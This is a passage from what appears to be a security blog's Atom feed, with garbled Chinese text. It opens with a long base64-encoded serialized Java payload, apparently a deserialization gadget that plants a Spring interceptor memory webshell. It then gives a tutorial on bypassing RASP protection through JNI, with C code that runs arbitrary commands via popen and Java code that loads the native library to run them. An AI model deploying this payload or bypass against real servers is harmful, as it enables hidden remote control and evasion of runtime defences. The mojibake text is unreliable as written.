Q29BS2tIQUlvTUFLb0FLd3dBcXdBckFRQVRhbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZiZ3dBVkFCVkRBQllBRmtCQUR0dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjZ0VBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQURKdmNtY3ZjM0J5YVc1blpuSmhiV1YzYjNKckwzZGxZaTl6WlhKMmJHVjBMMGhoYm1Sc1pYSkpiblJsY21ObGNIUnZjZ0VBRTJwaGRtRXZhVzh2VUhKcGJuUlhjbWwwWlhJQkFDVnFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBBUUFtYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFER2RsZEZCaGNtRnRaWFJsY2dFQUppaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFKWjJWMFYzSnBkR1Z5QVFBWEtDbE1hbUYyWVM5cGJ5OVFjbWx1ZEZkeWFYUmxjanNCQUJCcVlYWmhMMnhoYm1jdlUzbHpkR1Z0QVFBTFoyVjBVSEp2Y0dWeWRIa0JBQXQwYjB4dmQyVnlRMkZ6WlFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFJWTI5dWRHRnBibk1CQUJzb1RHcGhkbUV2YkdGdVp5OURhR0Z5VTJWeGRXVnVZMlU3S1ZvQkFCWW9XMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBVGNtVmthWEpsWTNSRmNuSnZjbE4wY21WaGJRRUFIU2hhS1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6YzBKMWFXeGtaWEk3QVFBRmMzUmhjblFCQUJVb0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQTVuWlhSSmJuQjFkRk4wY21WaGJRRUFGeWdwVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0FRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0FRQVRLRXhxWVhaaEwybHZMMUpsWVdSbGNqc3BWZ0VBQ0hKbFlXUk1hVzVsQVFBR1lYQndaVzVrQVFBdEtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJN0FRQUlkRzlUZEhKcGJtY0JBQU52ZFhRQkFCVk1hbUYyWVM5cGJ5OVFjbWx1ZEZOMGNtVmhiVHNCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVmdFQUJXWnNkWE5vQVFBRlkyeHZjMlVBSVFBbkFDZ0FBUUFwQUFBQUJBQUJBQ29BS3dBQkFDd0FBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBTFFBQUFBWUFBUUFBQUF3QUxnQUFBQXdBQVFBQUFBVUFMd0F3QUFBQUFRQXhBRElBQXdBc0FBQUNKd0FHQUFzQUFBRGNLeElDdVFBREFnQTZCQmtFeGdET0xMa0FCQUVBT2dVU0JiZ0FCcllBQnhJSXRnQUptUUFpdXdBS1dRYTlBQXRaQXhJTVUxa0VFZzFUV1FVWkJGTzNBQTQ2QnFjQUg3c0FDbGtHdlFBTFdRTVNEMU5aQkJJUVUxa0ZHUVJUdHdBT09nWVpCZ1MyQUJGWEdRYTJBQkk2QjdzQUUxbTdBQlJaR1FlMkFCVzNBQmEzQUJjNkNCSVlPZ203QUJsWnR3QWFPZ29aQ0xZQUcxazZDY1lBSUJrS3V3QVpXYmNBR2hrSnRnQWNFaDIyQUJ5MkFCNjJBQnhYcC8vYnNnQWZHUXEyQUNBWkJSa0t0Z0FoR1FXMkFDSVpCYllBSTZjQUJUb0ZBNndFckFBQkFBOEEwd0RXQUNRQUF3QXRBQUFBVmdBVkFBQUFEd0FLQUJBQUR3QVNBQmNBRkFBbkFCVUFSZ0FYQUdJQUdRQnBBQm9BY0FBYkFJVUFIQUNKQUIwQWtnQWVBSjBBSHdDNkFDRUF3Z0FpQU1rQUl3RE9BQ1FBMHdBbUFOWUFKUURZQUNjQTJnQXBBQzRBQUFCNkFBd0FRd0FEQURNQU5BQUdBQmNBdkFBMUFEWUFCUUJpQUhFQU13QTBBQVlBY0FCakFEY0FPQUFIQUlVQVRnQTVBRG9BQ0FDSkFFb0FPd0E4QUFrQWtnQkJBRDBBUGdBS0FBQUEzQUF2QURBQUFBQUFBTndBUHdCQUFBRUFBQURjQUVFQVFnQUNBQUFBM0FCREFFUUFBd0FLQU5JQVJRQThBQVFBUmdBQUFGVUFCLzBBUmdjQVJ3Y0FTUHdBR3djQVNmOEFMd0FMQndCS0J3QkxCd0JNQndCTkJ3QkhCd0JJQndCSkJ3Qk9Cd0JQQndCSEJ3QlFBQUFuL3dBYkFBVUhBRW9IQUVzSEFFd0hBRTBIQUVjQUFRY0FVUUVCQUZJQUFBQUVBQUVBSkFCVEFBQUFEUU1BUHdBQUFFRUFBQUJEQUFBQUFRQlVBRlVBQXdBc0FBQUFZQUFGQUFVQUFBQUtLaXNzTFJrRXR3QWxzUUFBQUFJQUxRQUFBQW9BQWdBQUFDNEFDUUF2QUM0QUFBQTBBQVVBQUFBS0FDOEFNQUFBQUFBQUNnQS9BRUFBQVFBQUFBb0FRUUJDQUFJQUFBQUtBRU1BUkFBREFBQUFDZ0JXQUZjQUJBQlNBQUFBQkFBQkFDUUFVd0FBQUJFRUFEOEFBQUJCQUFBQVF3QUFBRllBQUFBQkFGZ0FXUUFEQUN3QUFBQmdBQVVBQlFBQUFBb3FLeXd0R1FTM0FDYXhBQUFBQWdBdEFBQUFDZ0FDQUFBQU13QUpBRFFBTGdBQUFEUUFCUUFBQUFvQUx3QXdBQUFBQUFBS0FEOEFRQUFCQUFBQUNnQkJBRUlBQWdBQUFBb0FRd0JFQUFNQUFBQUtBRm9BV3dBRUFGSUFBQUFFQUFFQUpBQlRBQUFBRVFRQVB3QUFBRUVBQUFCREFBQUFXZ0FBQUFFQVhBQUFBQUlBWFE9PQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAKQApQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwcApgwApwBTDACoAKkHAKoHAKsMAKwArQwArgCvAQAQamF2YS9sYW5nL09iamVjdAEAO29yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuaW50ZXJjZXB0b3IuVGVzdEludGVyY2VwdG9yDACwALEMALIAswwAtAC1BwC2DAC3ALgBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgwAuQC6AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAGGNvbS9jbG93bi9JbnRlcmNlcHRvckRlcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA9wcmludFN0YWNrVHJhY2UBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxl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<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241114162939356.png" alt="image-20241114162939356"></p><p><img src="https://cdn.clown2024.cn/image-20241114163005607.png" alt="image-20241114163005607"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD=G=itD/YriQGkbvkp6QHKF4D&u_atoken=3b72cba8102056dc353d4296b75d2ed3&u_asig=0a47319217313359997215116e009a">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbvkp6QHKF4D&amp;u_atoken=3b72cba8102056dc353d4296b75d2ed3&amp;u_asig=0a47319217313359997215116e009a</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md</a></p><p><a href="https://forum.butian.net/share/3002">https://forum.butian.net/share/3002</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;Springæ¡†æ¶æ¯”è¾ƒå¸¸ç”¨å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å»ºä¸€ä¸ªspring+springmvcçš„é¡¹ç›®æ¥æµ‹è¯•å†…å­˜é©¬ï¼Œå†…å­˜é©¬ä¸»è¦çš„é€»è¾‘éƒ¨åˆ†éƒ½é›†ä¸­åœ¨spr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RASPç»•è¿‡å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-06T16:14:57.000Z</published>
    <updated>2024-11-11T14:43:13.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="raspä»‹ç»"><a href="#RASPä»‹ç»" class="headerlink" title="RASPä»‹ç»"></a>RASPä»‹ç»</h1><p>RASPå…¨ç§°æ˜¯Runtime applicaion self-protectionï¼Œåœ¨2014å¿µæå‡ºçš„ä¸€ç§åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤æŠ€æœ¯ï¼Œå°†é˜²æŠ¤åŠŸèƒ½æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¹‹ä¸­ï¼Œé€šè¿‡å°‘é‡çš„Hookå‡½æ•°ç›‘æµ‹ç¨‹åºçš„è¿è¡Œï¼Œæ ¹æ®å½“å‰çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå®æ—¶é˜»æ–­æ”»å‡»äº‹ä»¶ã€‚</p><p>ç›®å‰Java RASPä¸»è¦æ˜¯é€šè¿‡Instrumentationç¼–å†™Agentçš„å½¢å¼ï¼Œåœ¨Agentçš„premainå’Œagentmainä¸­åŠ å…¥æ£€æµ‹ç±»ä¸€èˆ¬ç»§æ‰¿äºClassFileTransformerï¼Œå½“ç¨‹åºè¿è¡Œè¿›æ¥çš„æ—¶å€™ï¼Œé€šè¿‡ç±»ä¸­çš„transformæ£€æµ‹å­—èŠ‚ç æ–‡ä»¶ä¸­æ˜¯å¦æœ‰ä¸€äº›æ•æ„Ÿçš„ç±»æ–‡ä»¶ï¼Œæ¯”å¦‚ProcessImplç­‰ã€‚ç®€å•çš„å¯ä»¥ç†è§£ä¸ºé€šè¿‡Instrumentationæ¥å¯¹JVMè¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>Instrumentation API æä¾›äº†ä¸¤ä¸ªæ ¸å¿ƒæ¥å£ï¼šClassFileTransformer å’Œ Instrumentationã€‚ClassFileTransformer æ¥å£å…è®¸å¼€å‘è€…åœ¨ç±»åŠ è½½å‰æˆ–ç±»é‡æ–°å®šä¹‰æ—¶å¯¹å­—èŠ‚ç è¿›è¡Œè½¬æ¢ã€‚Instrumentation æ¥å£åˆ™æä¾›äº†å¯åŠ¨æ—¶ä»£ç†å’Œé‡æ–°å®šä¹‰ç±»çš„èƒ½åŠ›</p><p>Java Agentå­˜åœ¨premainå’Œagentmainä¸¤ä¸ªæ–¹æ³•ï¼Œå…³äºè¿™ä¸¤ä¸ªæ–¹æ³•åœ¨ä¹‹å‰çš„java agentä¹Ÿè¯´è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†è¯´äº†</p><p>æ‰€ä»¥å…¶å®å°±æ˜¯å’Œå‰é¢çš„æ–‡ç« ä¸€æ ·ç¼–å†™ä¸€ä¸ªClassFileTransformerçš„å®ç°ç±»ï¼Œä½¿ç”¨è¯¥ç±»æ¥å¯¹ç¨‹åºè¿›è¡Œå®æ—¶ç›‘æ§ï¼Œå¦‚æœæ£€æµ‹åˆ°ç›¸å…³çš„å±é™©å‡½æ•°ï¼Œå°±é€šè¿‡transformæ–¹æ³•æ¥å¯¹ç±»å­—èŠ‚ç è¿›è¡Œè½¬åŒ–ã€‚</p><p>ä¸ä¼ ç»Ÿ WAF å¯¹æ¯”ï¼Œ RASP å®ç°æ›´ä¸ºåº•å±‚ï¼Œè§„åˆ™åˆ¶å®šæ›´ä¸ºç®€å•ï¼Œæ”»å‡»è¡Œä¸ºè¯†åˆ«æ›´ä¸ºç²¾å‡†ã€‚</p><h1 id="raspç»•è¿‡åŸç†"><a href="#RASPç»•è¿‡åŸç†" class="headerlink" title="RASPç»•è¿‡åŸç†"></a>RASPç»•è¿‡åŸç†</h1><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒRASPä¸»è¦æ˜¯é€šè¿‡è½¬æ¢å­—èŠ‚ç æ¥è¾¾åˆ°ç›®çš„ï¼Œå¦‚æœè®¾ç½®çš„æ£€æµ‹çš„æ–¹æ³•å­˜åœ¨ç€æ›´åº•å±‚çš„æ–¹æ³•æˆ–è€…ç›¸åŒå±‚çº§çš„ä¸åŒæ–¹æ³•èƒ½å¤Ÿè¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼Œé‚£ä¹ˆå°±èƒ½å®Œæˆç»•è¿‡ã€‚</p><p>æ‰€ä»¥ç»•è¿‡çš„æ‰‹æ³•å¤§è‡´ä¸ºä¸¤ç§ï¼š</p><ol><li>å¯»æ‰¾æ²¡æœ‰è¢«é™åˆ¶çš„ç±»æˆ–è€…å‡½æ•°æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ç»•è¿‡é»‘åå•</li><li>åˆ©ç”¨æ›´åº•å±‚çš„æŠ€æœ¯è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚ä» C ä»£ç çš„å±‚é¢è¿›è¡Œç»•è¿‡</li></ol><h1 id="jniç»•è¿‡"><a href="#JNIç»•è¿‡" class="headerlink" title="JNIç»•è¿‡"></a>JNIç»•è¿‡</h1><p>JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºåœ¨ Java ç¨‹åºä¸­è°ƒç”¨æœ¬åœ°ï¼ˆNativeï¼‰ä»£ç ï¼Œå³ä½¿ç”¨å…¶ä»–è¯­è¨€ï¼ˆå¦‚Cã€C++ï¼‰ç¼–å†™çš„ä»£ç ï¼Œä»è€Œå¯ä»¥å……åˆ†åˆ©ç”¨æœ¬åœ°ä»£ç çš„åŠŸèƒ½å’Œæ€§èƒ½ä¼˜åŠ¿ï¼Œå®ç°å¯¹åº•å±‚ç³»ç»Ÿèµ„æºå’Œå¤–éƒ¨åº“çš„è®¿é—®ã€‚</p><p>JNIçš„è®¾è®¡æ˜¯ä¸ºäº†è§£å†³javaæ— æ³•ç›´æ¥è®¿é—®åº•å±‚ç³»ç»Ÿèµ„æºæˆ–è€…åˆ©ç”¨æœ¬åœ°åº“çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡RASPã€‚æˆ‘ä»¬ç¼–å†™çš„ä»£ç æœ€åæ˜¯è¦ç¼–è¯‘ä¸ºdllåŠ¨æ€é“¾æ¥åº“æˆ–è€…soåŠ¨æ€å…±äº«åº“ï¼Œç„¶åJNIé€šè¿‡åŠ è½½è¿™äº›å…±äº«åº“æ¥æ‰§è¡Œæˆ‘ä»¬ç¼–å†™çš„æœ¬åœ°ä»£ç </p><p>æˆ‘ä»¬å†™ä¸€ä¸ªJNIä½¿ç”¨dllçš„ä¾‹å­ï¼Œå†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•</p><p>javaæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘æˆ.classæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javac Command.java<br></code></pre></td></tr></table></figure><p>ç„¶åå†ç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆcè¯­è¨€çš„.hå¤´æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javah -jni Command<br></code></pre></td></tr></table></figure><p>ç„¶åå†å»ç¼–å†™Command.cæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Command.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jni.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];   <br>    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!pipe)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (!feof(pipe))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), pipe))<br>        &#123; <br>            <span class="hljs-built_in">strcat</span>(result, buffer);<br>        &#125;<br>    &#125;<br>    pclose(pipe); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;     <br>&#125;<br>JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_Command_exec</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <br>    execmd(cstr, result);<br>    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">strcat</span>(return_messge, result);<br>    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);<br>    <span class="hljs-keyword">return</span> cmdresult;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™å¥½ä¹‹åè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘æˆdllæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include&quot;</span> -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include\win32&quot;</span> -D__int64=<span class="hljs-string">&quot;long long&quot;</span> --shared <span class="hljs-string">&quot;D:\CTF\Java\JavaCode\JNITest\src\main\java\Command.c&quot;</span>  -o ./jni.dll<br></code></pre></td></tr></table></figure><blockquote><p>-D æ˜¯ <code>gcc</code> ç¼–è¯‘å™¨çš„ä¸€ä¸ªé¢„å¤„ç†å™¨å‚æ•°ï¼Œç”¨äºå®šä¹‰å®</p><p>-Iç”¨äºæŒ‡å®šé¢å¤–çš„ç›®å½•ï¼Œè®©ç¼–è¯‘å™¨åœ¨è¿™äº›ç›®å½•ä¸­æœç´¢å¤´æ–‡ä»¶</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241107203652320.png" alt="image-20241107203652320"></p><p>ç„¶åç”¨System.loadæˆ–è€…System.loadsæ–¹æ³•å°±å¯ä»¥åŠ è½½è¿™ä¸ªdllï¼Œç„¶åå°±å¯ä»¥å®ä¾‹åŒ–Commandç±»è°ƒç”¨ä»–çš„nativeæ–¹æ³•äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br><span class="hljs-comment">//        System.loadLibrary(&quot;jni&quot;); //load()æŒ‡å®šç»å¯¹è·¯å¾„</span><br>        System.load(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JNITest\\src\\main\\java\\jni.dll&quot;</span>);<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ipconfig</span> <span class="hljs-operator">=</span> command.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(ipconfig);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªjava.library.pathæ˜¯javaæœç´¢å…±äº«åº“çš„è·¯å¾„ï¼Œå¦‚æœç”¨loadLibraryæ–¹æ³•çš„è¯ï¼Œä»–æ˜¯ä¸èƒ½å¸¦è·¯å¾„çš„ï¼Œåªèƒ½ä»java.library.pathä¸­æœç´¢å¹¶åŠ 